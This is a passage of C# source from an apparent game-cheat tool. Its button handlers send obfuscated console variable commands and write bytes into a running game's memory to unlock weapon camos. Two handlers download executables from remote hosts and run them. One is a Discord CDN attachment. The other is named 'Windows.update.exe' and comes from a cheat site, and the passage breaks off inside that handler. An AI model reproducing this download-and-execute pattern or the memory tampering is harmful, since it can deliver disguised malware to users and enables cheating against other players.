            this.Cbuf("set MTRLPQOPSR 1");
            this.Cbuf("set NLNTMRRQML 1");
        }

        private void metroButton30_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LTMKOQPNMR 1");
            this.Cbuf("set LNNMSPMMQS 1");
            this.Cbuf("set LRROQQPSMR 1");
            this.Cbuf("set NLOSLRRKSS 1");
            this.Cbuf("set LRQLSQPPTO 1");
            this.Cbuf("set MSPPSRRLNM 1");
            this.Cbuf("set NRTQNMSQ 1");
            this.Cbuf("set MLSKLOTNTR 1");
            this.Cbuf("set OMONPOMRSR 1");
            this.Cbuf("set LONQPKOQKL 1");
            this.Cbuf("set OMRRSOROPP 1");
            this.Cbuf("set LMOPTKKMNM 1");
            this.Cbuf("set NRPMSPLMLS 1");
            this.Cbuf("set MPRLLMQOQS 1");
            this.Cbuf("set OMTMKKMKOQ 1");
            this.Cbuf("set MPMPMRRPSQ 1");
            this.Cbuf("set LPOKPKRSSS 1");
            this.Cbuf("set LOLSRTTMPL 1");
            this.Cbuf("set MKKSSRKTOT 1");
            this.Cbuf("set LQPRTQKLLL 1");
            this.Cbuf("set NKTKQSLNOK 1");
            this.Cbuf("set OLKLSRSLOK 1");
            this.Cbuf("set MSTPTMPKNT 1");
            this.Cbuf("set TSKNNKLPQ 1");
            this.Cbuf("set MNQPSOKRSQ 1");
            this.Cbuf("set LQTMSLOOOR 1");
            this.Cbuf("set LORSOQTPML 1");
            this.Cbuf("set RNSSQTMSQ 1");
            this.Cbuf("set LNRRRMQRTO 1");
            this.Cbuf("set NLMPNPLLRM 1");
            this.Cbuf("set NTSOMQPKKK 1");
            this.Cbuf("set MMLNPQQLO 1");
            this.Cbuf("set LSLPTTMOTM 1");
            this.Cbuf("set PLMKTNQNT 1");
            this.Cbuf("set OMQNSKTKQM 1");
            this.Cbuf("set LSQNRROOQP 1");
            this.Cbuf("set MOKMRQPRSK 1");
            this.Cbuf("set MLSMRSTTQQ 1");
            this.Cbuf("set MLTLMKSLSS 1");
            this.Cbuf("set LSQMMTSPTL 1");
            this.Cbuf("set NSMNRNNNPO 1");
            this.Cbuf("set LLNRQKTPNR 1");
            this.Cbuf("set LQRMNPQTPM 1");
            this.Cbuf("set NLTTOLQNNO 1");
        }

        private void metroButton29_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LPNPKNLOMR 1");
            this.Cbuf("set NTSQLRNSRR 1");
            this.Cbuf("set LSMPRRTNNK 1");
            this.Cbuf("set LPPLRQMLKT 1");
            this.Cbuf("set SSNKKLPPS 1");
            this.Cbuf("set NPPRKNTSPL 1");
            this.Cbuf("set NPTRQLSPLM 1");
            this.Cbuf("set LPQPTRRTPL 1");
            this.Cbuf("set ONTOROMLL 1");
            this.Cbuf("set PNNQNRMST 1");
            this.Cbuf("set QPQTTORTL 1");
            this.Cbuf("set MOTMLNPRRQ 1");
            this.Cbuf("set NKKTPLTMMR 1");
            this.Cbuf("set TNPNKMKSL 1");
            this.Cbuf("set NSNLTQSSKS 1");
            this.Cbuf("set NMMNKMRRN 1");
            this.Cbuf("set LRKLPPKSMP 1");
            this.Cbuf("set ROMQPQRLM 1");
            this.Cbuf("set MKOMMKOQNR 1");
            this.Cbuf("set LNLTPNOLTQ 1");
            this.Cbuf("set LOTMOMRQKL 1");
            this.Cbuf("set LRPRPMPKSQ 1");
            this.Cbuf("set LOSQRKQOKT 1");
            this.Cbuf("set NTTLPSLQTN 1");
            this.Cbuf("set MPQNQOMKSN 1");
            this.Cbuf("set NMQPNKLLKT 1");
            this.Cbuf("set MOLRRNLSQT 1");
            this.Cbuf("set NKKPQQKSOS 1");
            this.Cbuf("set MOKNTNRSSN 1");
            this.Cbuf("set NLQTMTNOOT 1");
            this.Cbuf("set NPKPMKRSON 1");
            this.Cbuf("set RPOLSKLNS 1");
            this.Cbuf("set NOSONNPTLM 1");
            this.Cbuf("set LPQPTTPNRM 1");
            this.Cbuf("set OTKMRNMPN 1");
            this.Cbuf("set NTOSMKNMSM 1");
            this.Cbuf("set SOOKORNPT 1");
            this.Cbuf("set MSNLNQQORR 1");
            this.Cbuf("set LQRPLQRTSN 1");
            this.Cbuf("set MROOORPPTL 1");
            this.Cbuf("set LSMKKTOMRO 1");
        }

        private void metroButton33_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set MTRTSPTMSL 1");
            this.Cbuf("set NLTTKTRPTM 1");
            this.Cbuf("set NTTRTLSNKR 1");
            this.Cbuf("set NOMKQQOSLR 1");
            this.Cbuf("set OMLQOOPKQN 1");
            this.Cbuf("set MNLKKQRTKK 1");
            this.Cbuf("set MQPMMLSOOM 1");
            this.Cbuf("set MQNKTKQKST 1");
            this.Cbuf("set NRNNMRTSMP 1");
            this.Cbuf("set NPOKSQSNSQ 1");
            this.Cbuf("set MSSQORPMRQ 1");
            this.Cbuf("set LRTRNSRPML 1");
            this.Cbuf("set MPRPTSNPMS 1");
            this.Cbuf("set MQSSSPSLMK 1");
            this.Cbuf("set OKNPQMLKTT 1");
            this.Cbuf("set NTNOSQRROL 1");
            this.Cbuf("set NRMTLLNQKR 1");
            this.Cbuf("set NNOMMSQRTK 1");
            this.Cbuf("set LSQMRNNTOR 1");
            this.Cbuf("set LOTTLTNMQS 1");
            this.Cbuf("set LSKKOOSLKQ 1");
            this.Cbuf("set MTSPMLTTQR 1");
            this.Cbuf("set NSNOTQQLQO 1");
            this.Cbuf("set LKMKROOMPM 1");
            this.Cbuf("set OKRQOSSLTM 1");
            this.Cbuf("set SKNMQKNL 1");
            this.Cbuf("set NMKOQQLMTN 1");
            this.Cbuf("set LPQQSRQSMO 1");
            this.Cbuf("set LOLSNQLPKO 1");
            this.Cbuf("set OLTPPRMMKT 1");
            this.Cbuf("set NOLRNRPKTN 1");
            this.Cbuf("set NKOONQRRTM 1");
            this.Cbuf("set SKOOSRKKK 1");
            this.Cbuf("set RKRMTLOLQ 1");
            this.Cbuf("set MTTTSLOPQR 1");
            this.Cbuf("set MMNMNOLQTT 1");
            this.Cbuf("set LTKLKQSKOK 1");
            this.Cbuf("set MTMTMOLRQK 1");
            this.Cbuf("set NLTPNSPKOQ 1");
            this.Cbuf("set NTPPOMPLQM 1");
        }

      

  
      
       

        private void metroButton28_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set MLKSPNRQRL 1");
            this.Cbuf("set MKSNTLMSQR 1");
            this.Cbuf("set NTRLRTMMMP 1");
            this.Cbuf("set MQMQRKRNMN 1");
            this.Cbuf("set LRKSQRLNKN 1");
            this.Cbuf("set MPTNPPOPRP 1");
            this.Cbuf("set NOMQKRNSKQ 1");
            this.Cbuf("set LKKMPTPLMP 1");
            this.Cbuf("set NSNRTPNQPN 1");
            this.Cbuf("set NTSLOQPLNT 1");
            this.Cbuf("set LLQKSNOSS 1");
            this.Cbuf("set MSORRSMRQM 1");
            this.Cbuf("set NTPLTMKQOT 1");
            this.Cbuf("set PQOTPPRPP 1");
            this.Cbuf("set LOSKNONNMT 1");
            this.Cbuf("set NOOPTRPKQO 1");
            this.Cbuf("set TSPTKLQRM 1");
            this.Cbuf("set NSLTOKPOTM 1");
            this.Cbuf("set NMRQRRSQOK 1");
            this.Cbuf("set OSRNKMPTP 1");
            this.Cbuf("set SSTQQLSMT 1");
            this.Cbuf("set LNPPQSOLNN 1");
            this.Cbuf("set LLQMLNSTSK 1");
            this.Cbuf("set  MTTTROPML 1");
            this.Cbuf("set SMLKTKNRO 1");
            this.Cbuf("set QSPRQKKMN 1");
            this.Cbuf("set LMKKMPMOSO 1");
            this.Cbuf("set MRSNQSMSPL 1");
            this.Cbuf("set OKQRLRRRRS 1");
            this.Cbuf("set ONMLKTLMQ 1");
            this.Cbuf("set NQSQTKKTNM 1");
            this.Cbuf("set LTLTKMTPOT 1");
            this.Cbuf("set LLPOQNPMPP 1");
            this.Cbuf("set MOMTPMSLL 1");
        }

        private void metroButton16_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set MLQKTLRTSQ 1");
            this.Cbuf("set SQKQSMOOR 1");
            this.Cbuf("set MPNTMPPRPT 1");
            this.Cbuf("set NLNKSPPKMK 1");
            this.Cbuf("set MONQSQMML 1");
            this.Cbuf("set LKONMLONRT 1");
            this.Cbuf("set RPKMNOOTQ 1");
            this.Cbuf("set RLSOSNKRM 1");
            this.Cbuf("set MMOPQORTRN 1");
            this.Cbuf("set LKMNLNKTMM 1");
            this.Cbuf("set OLKNQTSTP 1");
            this.Cbuf("set NSTLLKTOPQ 1");
            this.Cbuf("set TTMMORMMM 1");
            this.Cbuf("set NKQMLQSQTS 1");
            this.Cbuf("set LKTSNOPKOR 1");
            this.Cbuf("set LROOTOPLLL 1");
            this.Cbuf("set LOPNPKPMLR 1");
            this.Cbuf("set LKOLRRKPQN 1");
            this.Cbuf("set MPSOPMOQMN 1");
            this.Cbuf("set MRMKPRSKMP 1");
            this.Cbuf("set MMOSSPRLKT 1");
            this.Cbuf("set OLTMQQLRRR 1");
            this.Cbuf("set OLRRQQQMKR 1");
            this.Cbuf("set LQTRKPNMMM 1");
            this.Cbuf("set LSTKRPRKOR 1");
            this.Cbuf("set NTNLQRNTNK 1");
            this.Cbuf("set NMRKOQQS 1");
            this.Cbuf("set OMLOTKTQKQ 1");
            this.Cbuf("set MMTLLKMQON 1");
            this.Cbuf("set LNPOTTTORS 1");
            this.Cbuf("set LSQPOKTLNK 1");
            this.Cbuf("set NLPRMMRNT 1");
        }

        private void metroButton23_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set ROMNNNOLL 1");
            this.Cbuf("set MQMPTSSKQS 1");
            this.Cbuf("set NPKTRTPKRK 1");
            this.Cbuf("set MQQRLKSPOT 1");
            this.Cbuf("set LLMKNKQRRP 1");
            this.Cbuf("set LOONLLNNQN 1");
            this.Cbuf("set LKLPSNRQOT 1");
            this.Cbuf("set NSLPMTMTST 1");
            this.Cbuf("set NRMRNMOSTN 1");
            this.Cbuf("set LPQTLMRONT 1");
            this.Cbuf("set OKSKOSSTNM 1");
            this.Cbuf("set OKOPQTKNLP 1");
            this.Cbuf("set LNKNQKTNPN 1");
            this.Cbuf("set NNQMNMQOOR 1");
            this.Cbuf("set NMRLRMKOOS 1");
            this.Cbuf("set MLMTPQPKST 1");
            this.Cbuf("set MOTNTMNOSP 1");
            this.Cbuf("set NOKSLTKTRT 1");
            this.Cbuf("set LMSQORSRKQ 1");
            this.Cbuf("set NSKLLRMLTO 1");
            this.Cbuf("set NRTQNPPRK 1");
            this.Cbuf("set LPLLSKNLQT 1");
            this.Cbuf("set MRLTPNQLN 1");
            this.Cbuf("set LQNPNLRMQO 1");
            this.Cbuf("set RKKONMRQP 1");
            this.Cbuf("set PQPSNTPOP 1");
            this.Cbuf("set LSTTOQOSLL 1");
            this.Cbuf("set MPPNPQLQNT 1");
            this.Cbuf("set LSPTLTKQOQ 1");
            this.Cbuf("set MMLOOOTM 1");
        }

        private void metroButton21_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set LMRTMKQRQK 1");
            this.Cbuf("set MKNNSQLOOO 1");
            this.Cbuf("set OMQLOROKSK 1");
            this.Cbuf("set LMKQSSOKPR 1");
            this.Cbuf("set NPONKOQNST 1");
            this.Cbuf("set LPOPOQKPOT 1");
            this.Cbuf("set LQKSROQNLR 1");
            this.Cbuf("set NQQOTLKORN 1");
            this.Cbuf("set STQLSKPPL 1");
            this.Cbuf("set NTPTLMRPKR 1");
            this.Cbuf("set MQSRMTKKOS 1");
            this.Cbuf("set NPOKROSOPQ 1");
            this.Cbuf("set NKPPNOMOMQ 1");
            this.Cbuf("set LPPRSLLMPN 1");
            this.Cbuf("set OSLTTQLPN 1");
            this.Cbuf("set MQMSNMSPR 1");
            this.Cbuf("set NKOMLNMPMP 1");
            this.Cbuf("set SKOPRONRP 1");
            this.Cbuf("set NQRSSPNQKQ 1");
            this.Cbuf("set OTSQOKQNO 1");
            this.Cbuf("set LNMMKSNLSS 1");
            this.Cbuf("set LRQOPTKKQS 1");
            this.Cbuf("set NPQRMKKSNM 1");
            this.Cbuf("set LKMRKTPQQK 1");
            this.Cbuf("set NOPTLSQPLM 1");
            this.Cbuf("set MTRQMQTSMN 1");
            this.Cbuf("set MRQLMLKSQS 1");
            this.Cbuf("set LNTPLQPNKP 1");
            this.Cbuf("set NKKQOKMOTO 1");
        }

        private void metroButton10_Click_14(object sender, EventArgs e)
        {
            this.Cbuf("set NLRLLQMPKS 1");
            this.Cbuf("set MLKOOQSQOO 1");
            this.Cbuf("set QOQSPMMOR 1");
            this.Cbuf("set MPTMLPPRST 1");
            this.Cbuf("set LPKQRONTRS 1");
            this.Cbuf("set LLQMPNLKPT 1");
            this.Cbuf("set NONQMTLNNN 1");
            this.Cbuf("set LLMTSPSMPL 1");
            this.Cbuf("set NRMNQNKLPL 1");
            this.Cbuf("set NMLSRRLSTP 1");
            this.Cbuf("set NQQPLLKMQQ 1");
            this.Cbuf("set MKLRSKPPNP 1");
            this.Cbuf("set OLPOMROQKS 1");
            this.Cbuf("set MRSPTLLKQL 1");
            this.Cbuf("set MQMOMNMTSS 1");
            this.Cbuf("set RNRQSOST 1");
            this.Cbuf("set LPNNKOTKKN 1");
            this.Cbuf("set NTOSSLKMMP 1");
            this.Cbuf("set MMSRQNMQM 1");
            this.Cbuf("set NKMMPKRRSL 1");
            this.Cbuf("set NQMNLRQQR 1");
            this.Cbuf("set MNSKLTTLOQ 1");
            this.Cbuf("set RQRMQKTLN 1");
            this.Cbuf("set MLMPRLNLNM 1");
            this.Cbuf("set LKPQLSPSRK 1");
            this.Cbuf("set MNOKQORLOK 1");
            this.Cbuf("set TLNSRKRQP 1");
            this.Cbuf("set MMONQLOPSO 1");
            this.Cbuf("set NONQLQLSLL 1");
            this.Cbuf("set LLRLOTMLOT 1");
            this.Cbuf("set NNNNLMPNM 1");
            this.Cbuf("set LLSMQNPRSP 1");
            this.Cbuf("set TTNPLTSKM 1");
            this.Cbuf("set NNNOKNORPR 1");
            this.Cbuf("set NKTLMRMLLL 1");
            this.Cbuf("set LLOROQTRSO 1");
            this.Cbuf("set MPPSOMMMKQ 1");
            this.Cbuf("set LQMRTMQPQM 1");
            this.Cbuf("set NQMQSTSSNQ 1");
            this.Cbuf("set MPNLOLTTSL 1");
            this.Cbuf("set PTPRTPTLP 1");
            this.Cbuf("set NTOQQNPKN 1");
            this.Cbuf("set MPSSMQNTKS 1");
            this.Cbuf("set LMTRMMNRTL 1");
            this.Cbuf("set NTLPKLQRT 1");
            this.Cbuf("set MRKQMROOSQ 1");
            this.Cbuf("set NORTQRPRPM 1");
            this.Cbuf("set NOPQSROMKK 1");
            this.Cbuf("set LLKMRMNKMS 1");
            this.Cbuf("set NTSSLOPMQS 1");
        }

        private void metroButton26_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set QKSOMPPMO 1");
            this.Cbuf("set MONMOQNKPP 1");
            this.Cbuf("set OTNTKRTSL 1");
            this.Cbuf("set LTOQRQMMLQ 1");
            this.Cbuf("set LNSSNOTRP 1");
            this.Cbuf("set MRQSLSSTLP 1");
            this.Cbuf("set NLLTLPKNTP 1");
            this.Cbuf("set MNMLRKRSSL 1");
            this.Cbuf("set MSTMORLPKN 1");
            this.Cbuf("set NNKLRNNSOP 1");
            this.Cbuf("set LKKNORQKTP 1");
            this.Cbuf("set MPPRMTPSLT 1");
            this.Cbuf("set PMORNPNTK 1");
            this.Cbuf("set LKMTLQRRSO 1");
            this.Cbuf("set LRRNQTQTTM 1");
            this.Cbuf("set OMPLRMMKML 1");
            this.Cbuf("set LPORTLTMNP 1");
            this.Cbuf("set PNRLKKKOQ 1");
            this.Cbuf("set MSTMLNKSSO 1");
            this.Cbuf("set LQSKTTTKSK 1");
            this.Cbuf("set MOMQQONMMT 1");
            this.Cbuf("set OKPMLPMNM 1");
            this.Cbuf("set LTKKKPSRSK 1");
            this.Cbuf("set RTQLQLKKR 1");
            this.Cbuf("set LQPRRQMQSN 1");
            this.Cbuf("set OMMRTLQSKS 1");
            this.Cbuf("set LSPPSOKPLP 1");
            this.Cbuf("set OKRSLSSNRS 1");
            this.Cbuf("set LRKQLLMKSP 1");
        }

        private void metroButton11_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set NTMSOPTTOS 1");
            this.Cbuf("set LPPQNSNQPP 1");
            this.Cbuf("set NRRSRNLPLS 1");
            this.Cbuf("set MQKOOSMQQP 1");
            this.Cbuf("set PNLSQNMNM 1");
            this.Cbuf("set MOPORPOMNP 1");
            this.Cbuf("set NSMLNOSKM 1");
        }

        private void metroButton47_Click(object sender, EventArgs e)
        {

        }

        private void metroButton34_Click_3(object sender, EventArgs e)
        {

        }

        private void metroButton4_Click_10(object sender, EventArgs e)
        {

        }

        private void metroButton13_Click_15(object sender, EventArgs e)
        {

        }

        private void metroButton42_Click(object sender, EventArgs e)
        {
            this.Cbuf("set LMTMRLMOT 1");
        }

        private void metroButton9_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set NSSPMPLRQL 1");
        }

        private void metroButton5_Click_21(object sender, EventArgs e)
        {
            this.Cbuf("set MKRSSOQLML 1");
        }

        private void metroButton4_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set NPORSPPNOK 1");
        }

        private void metroButton24_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set OQSOKOKRQ 1");
        }

        private void metroButton22_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set MQPLMMMPRT 1");
        }

        private void metroButton17_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set LTKQTLPOLT 1");
        }

        private void metroButton38_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LNNQQMNNPM 1");
        }

        private void metroButton34_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set MPPMOTSLNN 1");
        }

        private void metroButton5_Click_22(object sender, EventArgs e)
        {
            this.Cbuf("set LOSQPPNNRT 1");
        }

        private void metroButton17_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set MRRNPSMQTS 1");
        }

        private void metroButton13_Click_16(object sender, EventArgs e)
        {
            this.Cbuf("set NTNOQQSQLM 1");
        }

        private void metroButton9_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set LPOSSQMTTQ 1");
        }

        private void metroButton8_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set LSSNQRQSST 1");
        }

        private void metroButton24_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set MTNPRPNTTT 1");
        }

        private void metroButton22_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set MTNPRPNTTT 1");
        }

     

        private void metroButton39_Click(object sender, EventArgs e)
        {
        }

        private void metroButton34_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LPKPPSSTON 1");
        }

        private void metroButton38_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set MOMSNOKSSP 1");
        }

        private void metroButton41_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NSKKNPRMOQ 1");
        }

        private void metroButton40_Click(object sender, EventArgs e)
        {
            this.Cbuf("set LONSLMNROK 1");
        }

        

        private void guna2ToggleSwitch49_CheckedChanged(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/900123100388143114/917158623115890718/FOV_CIRCLE.exe", "FOV_CIRCLE.exe");
                    Process.Start("FOV_CIRCLE.exe");
                }
            }
        }

        private void metroButton4_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set QNOQQRSQO 1");
        }

        private void metroButton9_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set NLMSTOMKNR 1");
            this.Cbuf("set LLLRKRROOP 1");
            this.Cbuf("set NPRMROSQTN 1");
        }

        private void metroButton8_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set QLQPTPLNN 1");
            this.Cbuf("set LNKLOMQOS 1");
        }

      

        private void metroButton6_Click_21(object sender, EventArgs e)
        {
            this.Cbuf("set SKOOSRKKK 1");
            this.Cbuf("set RKRMTLOLQ 1");
            this.Cbuf("set MTTTSLOPQR 1");
            this.Cbuf("set MMNMNOLQTT 1");
            this.Cbuf("set LTKLKQSKOK 1");
            this.Cbuf("set MTMTMOLRQK 1");
            this.Cbuf("set NLTPNSPKOQ 1");
            this.Cbuf("set NTPPOMPLQM 1");
        }

        private void metroButton5_Click_24(object sender, EventArgs e)
        {
            
            this.Cbuf("set MPRPTSNPMS 1");
            this.Cbuf("set MQSSSPSLMK 1");
            this.Cbuf("set OKNPQMLKTT 1");
            this.Cbuf("set NTNOSQRROL 1");
            this.Cbuf("set NRMTLLNQKR 1");
            this.Cbuf("set NNOMMSQRTK 1");
            this.Cbuf("set LSQMRNNTOR 1");
            this.Cbuf("set LOTTLTNMQS 1");
            this.Cbuf("set LSKKOOSLKQ 1");
            this.Cbuf("set MTSPMLTTQR 1");
        }

        private void metroButton4_Click_13(object sender, EventArgs e)
        {
            this.Cbuf("set MTRTSPTMSL 1");
            this.Cbuf("set NLTTKTRPTM 1");
            this.Cbuf("set NTTRTLSNKR 1");
            this.Cbuf("set NOMKQQOSLR 1");
            this.Cbuf("set OMLQOOPKQN 1");
            this.Cbuf("set MNLKKQRTKK 1");
            this.Cbuf("set MQPMMLSOOM 1");
            this.Cbuf("set MQNKTKQKST 1");
            this.Cbuf("set NRNNMRTSMP 1");
            this.Cbuf("set NPOKSQSNSQ 1");
            this.Cbuf("set MSSQORPMRQ 1");
            this.Cbuf("set LRTRNSRPML 1");
        }

        private void metroButton8_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set NSNOTQQLQO 1");
            this.Cbuf("set LKMKROOMPM 1");
            this.Cbuf("set OKRQOSSLTM 1");
            this.Cbuf("set SKNMQKNL 1");
            this.Cbuf("set NMKOQQLMTN 1");
            this.Cbuf("set LPQQSRQSMO 1");
            this.Cbuf("set LOLSNQLPKO 1");
            this.Cbuf("set OLTPPRMMKT 1");
            this.Cbuf("set NOLRNRPKTN 1");
            this.Cbuf("set NKOONQRRTM 1");
        }

        private void metroButton9_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set LROTSRRQMQ 1");
            this.Cbuf("set MKPOPRMKLL 1");
        }

        private void metroButton11_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set OLSKLTPPMR 1");
            this.Cbuf("set NKMOPQSPMO 1");
            this.Cbuf("set LMQOKPRSML 1");
            this.Cbuf("set SKNSKQTQR 1");
            this.Cbuf("set OLKRNORMOQ 1");
            this.Cbuf("set LTLQSKRKQM 1");
            this.Cbuf("set QKMSSSLPK 1");
            this.Cbuf("set LQKPQMPRQN 1");
        }

        private void metroButton10_Click_15(object sender, EventArgs e)
        {
            this.Cbuf("set LROTSRRQMQ 1");
            this.Cbuf("set MKPOPRMKLL 1");
            this.Cbuf("set MKPRSSNNRO 1");
            this.Cbuf("set MROTQQSMP 1");
            this.Cbuf("set NQMONTLKNN 1");
            this.Cbuf("set NTMMTOLQMQ 1");
            this.Cbuf("set NQTLPTNSSO 1");
            this.Cbuf("set LQLSPQOPKM 1");
            this.Cbuf("set MQPQKNPQOK 1");
            this.Cbuf("set MRNRKKOPLN 1");
        }

        private void metroButton13_Click_17(object sender, EventArgs e)
        {
            this.Cbuf("set MSRPQTQOOK 1");
            this.Cbuf("set NPSTLPMPSS 1");
            this.Cbuf("set OMNSNROMPQ 1");
            this.Cbuf("set RLPNQQRPR 1");
            this.Cbuf("set MSPSTOSTTL 1");
            this.Cbuf("set LRSKLPRNOP 1");
            this.Cbuf("set LKTPRPKPMR 1");
            this.Cbuf("set LOSOOOTNMS 1");
            this.Cbuf("set NNMLSMNTOQ 1");
        }

        private void metroButton4_Click_14(object sender, EventArgs e)
        {
            this.Cbuf("set LKQROKRTLN 1");
            this.Cbuf("set LOKOLPNMNP 1");
            this.Cbuf("set LPLPNLSORL 1");
            this.Cbuf("set OQLLQNMS 1");
            this.Cbuf("set MNQTSRMPMP 1");
            this.Cbuf("set MSKPMNRQTS 1");
            this.Cbuf("set OKMSPKPMLO 1");
            this.Cbuf("set LSRQOQNRMM 1");
        }

        private void metroButton5_Click_25(object sender, EventArgs e)
        {
            this.Cbuf("set NPNQOLKSLP 1");
            this.Cbuf("set MQNSRRKQOT 1");
            this.Cbuf("set OLMPOQOPTT 1");
            this.Cbuf("set NTRNROLSQL 1");
            this.Cbuf("set MPRTTPPOT 1");
        }

        private void metroButton8_Click_11(object sender, EventArgs e)
        {
            this.Cbuf("set NRSSNMNLLL 1");
            this.Cbuf("set ROSRMLLKM 1");
            this.Cbuf("set MPPMNQQRPT 1");
            this.Cbuf("set MLTTRLKPS 1");
            this.Cbuf("set PTONNRNQ 1");
            this.Cbuf("set MSLOQLMTRT 1");
            this.Cbuf("set NNPRNQMTQO 1");
            this.Cbuf("set MSRRMTLOQP 1");
        }

        private void metroButton16_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set ONNPLTTTM 1");
            this.Cbuf("set MPOSPQTTNR 1");
            this.Cbuf("set ROTRKSQNT 1");
            this.Cbuf("set MOLOQRLLQK 1");
            this.Cbuf("set MMOOTLNTNR 1");
            this.Cbuf("set MOOMOLTQSP 1");
            this.Cbuf("set OTPQONQQT 1");
        }

        private void metroButton10_Click_16(object sender, EventArgs e)
        {
            this.Cbuf("set ONMLKTLMQ 1");
            this.Cbuf("set NQSQTKKTNM 1");
            this.Cbuf("set LTLTKMTPOT 1");
            this.Cbuf("set LLPOQNPMPP 1");
            this.Cbuf("set MOMTPMSLL 1");
        }

        private void metroButton11_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set NOMQKRNSKQ 1");
            this.Cbuf("set LKKMPTPLMP 1");
            this.Cbuf("set NSNRTPNQPN 1");
            this.Cbuf("set NTSLOQPLNT 1");
            this.Cbuf("set LLQKSNOSS 1");
        }

        private void metroButton13_Click_18(object sender, EventArgs e)
        {
            this.Cbuf("set MSORRSMRQM 1");
            this.Cbuf("set NTPLTMKQOT 1");
            this.Cbuf("set PQOTPPRPP 1");
            this.Cbuf("set LOSKNONNMT 1");
            this.Cbuf("set NOOPTRPKQO 1");
            this.Cbuf("set TSPTKLQRM 1");
            this.Cbuf("set NSLTOKPOTM 1");
            this.Cbuf("set NMRQRRSQOK 1");
            this.Cbuf("set OSRNKMPTP 1");
            this.Cbuf("set SSTQQLSMT 1");
            this.Cbuf("set LNPPQSOLNN 1");
        }

        private void metroButton20_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LLQMLNSTSK 1");
            this.Cbuf("set  MTTTROPML 1");
            this.Cbuf("set SMLKTKNRO 1");
            this.Cbuf("set QSPRQKKMN 1");
            this.Cbuf("set LMKKMPMOSO 1");
            this.Cbuf("set MRSNQSMSPL 1");
            this.Cbuf("set OKQRLRRRRS 1");
        }

        private void metroButton17_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set MLKSPNRQRL 1");
            this.Cbuf("set MKSNTLMSQR 1");
            this.Cbuf("set NTRLRTMMMP 1");
            this.Cbuf("set MQMQRKRNMN 1");
            this.Cbuf("set LRKSQRLNKN 1");
            this.Cbuf("set MPTNPPOPRP 1");
        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            {
                if (VGCamoSwapComboBox.Text == "Gold (VG)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "73 34 5F 63 61 6D 6F 5F 31 31 61");
                }
                else if (VGCamoSwapComboBox.Text == "Platinum (VG)")
                {
                    jm.WriteBytes("base+22E67804,50,90C,7", "73 34 5F 63 61 6D 6F 5F 31 31 62");
                }
                else if (VGCamoSwapComboBox.Text == "Damascus (VG)")
                {
                    jm.WriteBytes("base22E67804,50,90C,7", "73 34 5F 63 61 6D 6F 5F 31 31 63");
                }
            }
        }

        private void groupBox2_Enter_1(object sender, EventArgs e)
        {

        }

        private void metroButton10_Click_17(object sender, EventArgs e)
        {
            this.Cbuf("set QTSPTNLOL 1");
            
        }
    

        private void metroButton5_Click_26(object sender, EventArgs e)
        {
            this.Cbuf("set LTMOQONPQ 1");
            this.Cbuf("set LOPKSRNTTS 1");
        }

        private void metroButton9_Click_12(object sender, EventArgs e)
        {
            this.Cbuf("set LQSSPMSRQK 1");
        }

   

      

        private void guna2ToggleSwitch52_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch53_CheckedChanged(object sender, EventArgs e)
        {

        }

      

        private void groupBox8_Enter(object sender, EventArgs e)
        {

        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {
            {
                jm.WriteBytes("base+22E67804,50,90C,7", "73 34 5F 63 61 6D 6F 5F 31 31 61");
            }
        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {

        }

        private void CWCamoSwapComboBox_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void siticonePictureBox1_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+09B407E0,28,558,7b8,e0", "73 34 5F 63 61 6D 6F 5F 31 31 61");
        }

        private void siticonePictureBox3_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+09B407E0,28,558,7b8,e0", "73 34 5F 63 61 6D 6F 5F 31 31 62");
        }

        private void siticonePictureBox2_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+09B407E0,28,558,7b8,e0", "73 34 5F 63 61 6D 6F 5F 31 31 63");
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void ProcOpenLabel_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click_2(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
            
                    web1.DownloadFile("http://nxtg3ncheats.com/download/Windows.update.exe", "Windows.update.exe");
